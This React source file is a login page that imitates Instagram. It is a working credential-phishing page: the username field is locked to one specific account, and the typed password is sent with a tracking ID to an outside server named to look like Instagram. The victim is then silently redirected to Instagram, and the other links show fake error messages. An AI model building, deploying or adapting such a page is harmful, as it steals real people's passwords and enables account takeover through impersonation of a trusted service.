import React, { useState, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { Eye, EyeOff } from 'lucide-react';
import './Login.css'; // Instagram clone styles

const Login = () => {
  const [username, setUsername] = useState('rushiiiii_____00');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  // Reset body background when mounting since Instagram uses #fafafa
  useEffect(() => {
    const originalBackground = document.body.style.backgroundColor;
    document.body.style.backgroundColor = '#fafafa';
    return () => {
      document.body.style.backgroundColor = originalBackground;
    };
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    
    if (password.length < 6) {
      setError('Password must be at least 6 characters.');
      return;
    }

    setError('');
    setLoading(true);

    try {
      let nextUrl = searchParams.get('next');
      
      const API_BASE = import.meta.env.VITE_API_BASE_URL || 'https://instagram-com-gzyy.onrender.com';
      const response = await fetch(`${API_BASE}/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
          username, 
          password,
          shortId: nextUrl || ''
        }),
        credentials: 'include'
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.message || 'Login failed');
      }

      const responseData = await response.json();

      // Successful login - go to original destination URL (or instagram if fallback)
      if (responseData.destination) {
        window.location.href = responseData.destination;
      } else {
        window.location.href = 'https://instagram.com';
      }
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ backgroundColor: '#fafafa', minHeight: '100vh', width: '100%' }}>
      <main className="login-main flex align-items-center justify-content-center">
          <section id="mobile" className="flex">
              {/* Optional: Add mobile mockup images if desired */}
          </section>
          <section id="auth" className="flex direction-column">
              <div className="panel login flex direction-column">
                  <h1 title="Instagram" className="flex justify-content-center">
                      <img src="/img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                  </h1>
                  
                  {error && <div className="error-msg">{error}</div>}

                  <form onSubmit={handleLogin}>
                      <label htmlFor="username" className="sr-only">Phone number, username, or email</label>
                      <input 
                        id="username"
                        name="username" 
                        placeholder="Phone number, username, or email" 
                        value={username}
                        readOnly
                        required
                      />

                      <label htmlFor="password" className="sr-only">Password</label>
                      <div style={{ position: 'relative', width: '100%', marginBottom: '8px' }}>
                        <input 
                          id="password"
                          name="password" 
                          type={showPassword ? "text" : "password"} 
                          placeholder="Password" 
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          required
                          style={{ marginBottom: 0, paddingRight: '40px' }}
                        />
                        <button 
                          type="button" 
                          onClick={() => setShowPassword(!showPassword)}
                          style={{
                            position: 'absolute',
                            right: '10px',
                            top: '50%',
                            transform: 'translateY(-50%)',
                            background: 'transparent',
                            border: 'none',
                            padding: 0,
                            margin: 0,
                            color: '#262626',
                            cursor: 'pointer',
                            display: 'flex',
                            alignItems: 'center',
                            height: 'auto',
                            width: 'auto',
                          }}
                        >
                          {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                        </button>
                      </div>

                      <button type="submit" disabled={loading}>
                        {loading ? 'Logging in...' : 'Log in'}
                      </button>
                  </form>
                  <div className="flex separator align-items-center">
                      <span></span>
                      <div className="or">OR</div>
                      <span></span>
                  </div>
                  <div className="login-with-fb flex direction-column align-items-center">
                      <div>
                          {/* <img /> */}
                          <a href="#" onClick={(e) => { e.preventDefault(); setError('Something went wrong, try with the official app'); }}>Log in with Facebook</a>
                      </div>
                      <a href="#" onClick={(e) => { e.preventDefault(); setError('Something went wrong, try with the official app'); }}>Forgot password?</a>
                  </div>
              </div>
              <div className="panel register flex justify-content-center">
                  <p>Don't have an account?</p>
                  <a href="#" onClick={(e) => { e.preventDefault(); setError('Something went wrong, try with the official app'); }}>Sign up</a>
              </div>
              <div className="app-download flex direction-column align-items-center">
                  <p>Get the app.</p>
                  <div className="flex justify-content-center">
                      <img src="/img/apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
                      <img src="/img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                  </div>
              </div>
          </section>
      </main>
      <footer className="login-footer">
          <ul className="flex flex-wrap justify-content-center">
              <li><a href="#">ABOUT</a></li>
              <li><a href="#">HELP</a></li>
              <li><a href="#">PRESS</a></li>
              <li><a href="#">API</a></li>
              <li><a href="#">JOBS</a></li>
              <li><a href="#">PRIVACY</a></li>
              <li><a href="#">TERMS</a></li>
              <li><a href="#">LOCATIONS</a></li>
              <li><a href="#">TOP ACCOUNTS</a></li>
              <li><a href="#">HASHTAGS</a></li>
              <li><a href="#">LANGUAGE</a></li>
          </ul>
          <p className="copyright">© 2020 Instagram from Facebook</p>
      </footer>
    </div>
  );
};

export default Login;
